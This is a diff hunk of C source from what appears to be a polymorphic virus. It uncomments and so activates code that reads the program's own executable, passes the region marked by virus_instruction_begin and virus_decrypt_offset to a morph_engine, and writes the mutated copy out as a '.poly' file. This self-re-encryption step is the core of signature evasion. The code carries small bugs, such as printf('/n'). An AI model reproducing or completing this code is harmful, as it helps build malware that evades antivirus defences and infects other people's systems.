@@ -128,42 +128,42 @@ int polymorphic(int argc, char* argv[])
 		return 1;
 	}
 
-	// // read the entire executable file
-	// if(!fread(exe_data, exe_size, 1, exe_file))
-	// {
-	// 	fclose(exe_file);
-	// 	printf("Executable file read failed\n");
-	// }
+	// read the entire executable file
+	if(!fread(exe_data, exe_size, 1, exe_file))
+	{
+		fclose(exe_file);
+		printf("Executable file read failed\n");
+	}
 
-	// // close the file
-	// fclose(exe_file);
+	// close the file
+	fclose(exe_file);
 
 
 
-	// // call the polymorphic engine
-	// if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
-	// {
-	// 	printf("An error occured in the polymorphic engine\n");
+	// call the polymorphic engine
+	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
+	{
+		printf("An error occured in the polymorphic engine\n");
 
-	// }
+	}
 
-	// // initialize the output filename
-	// char out_filename[FILENAME_MAX];
-	// snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
-    //   printf("/n");
-	// // open the output file
-	// FILE* out_file = fopen(out_filename, "wb");
-	// if(!out_file)
-	// {
-	// 	printf("failed to open %s\n", out_filename);
-	// 	// goto quit;
-	// }
+	// initialize the output filename
+	char out_filename[FILENAME_MAX];
+	snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
+      printf("/n");
+	// open the output file
+	FILE* out_file = fopen(out_filename, "wb");
+	if(!out_file)
+	{
+		printf("failed to open %s\n", out_filename);
+		// goto quit;
+	}
 
-	// // write the modified executable data
-	// if(!fwrite(exe_data, exe_size, 1, out_file))
-	// {
-	// 	printf("failed to write into %s\n", out_filename);
-	// }
+	// write the modified executable data
+	if(!fwrite(exe_data, exe_size, 1, out_file))
+	{
+		printf("failed to write into %s\n", out_filename);
+	}
 
       quit:
             free(exe_data);
